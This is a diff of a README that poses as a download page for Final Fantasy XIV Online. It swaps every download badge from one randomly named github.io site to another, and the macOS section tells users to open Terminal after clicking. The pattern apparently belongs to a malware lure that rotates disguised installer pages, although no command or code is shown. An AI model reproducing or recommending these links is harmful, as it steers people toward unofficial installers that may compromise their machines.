@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download Final Fantasy XIV Online](https://img.shields.io/badge/⬇_Download_Final%20Fantasy%20XIV%20Online-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download Final Fantasy XIV Online](https://img.shields.io/badge/⬇_Download_Final%20Fantasy%20XIV%20Online-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -65,9 +65,9 @@ Final Fantasy XIV Online is Square Enix's critically acclaimed MMORPG featuring 
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -85,7 +85,7 @@ Final Fantasy XIV Online is Square Enix's critically acclaimed MMORPG featuring 
 
 <div align="center">
 
-[![⬇ Download Final Fantasy XIV Online](https://img.shields.io/badge/⬇_Download_Final%20Fantasy%20XIV%20Online-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download Final Fantasy XIV Online](https://img.shields.io/badge/⬇_Download_Final%20Fantasy%20XIV%20Online-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -117,7 +117,7 @@ Final Fantasy XIV Online is Square Enix's critically acclaimed MMORPG featuring 
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -142,7 +142,7 @@ Final Fantasy XIV Online is Square Enix's critically acclaimed MMORPG featuring 
 
 <div align="center">
 
-[![⬇ Download Final Fantasy XIV Online](https://img.shields.io/badge/⬇_Download_Final%20Fantasy%20XIV%20Online-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download Final Fantasy XIV Online](https://img.shields.io/badge/⬇_Download_Final%20Fantasy%20XIV%20Online-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
